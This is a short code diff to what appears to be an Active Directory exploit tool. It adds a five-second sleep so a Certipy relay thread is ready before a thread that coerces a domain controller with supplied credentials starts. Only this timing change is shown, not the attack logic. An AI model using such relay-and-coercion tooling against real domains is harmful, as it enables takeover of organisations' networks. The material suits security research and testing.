@@ -42,6 +42,7 @@ import ldap3
 import json
 import re
 import threading
+import time
 from datetime import datetime
 
 
@@ -253,6 +254,8 @@ class Exploit:
             print(f'[*] Certificate authority {self.__ca_dns} is not a domain controller')
             certipy_thread = CertipyRelay(1, "CertipyRelayThread", self.__ca_dns)
             certipy_thread.start()
+            print('[*] Sleep for 5 seconds to wait for Certipy relay setup')
+            time.sleep(5)
             
             coercer_thread = Coercer(2, "CoercerThread", self.__domain, self.__username, self.__password, self.__dc[0], self.__lhost)
             coercer_thread.start()
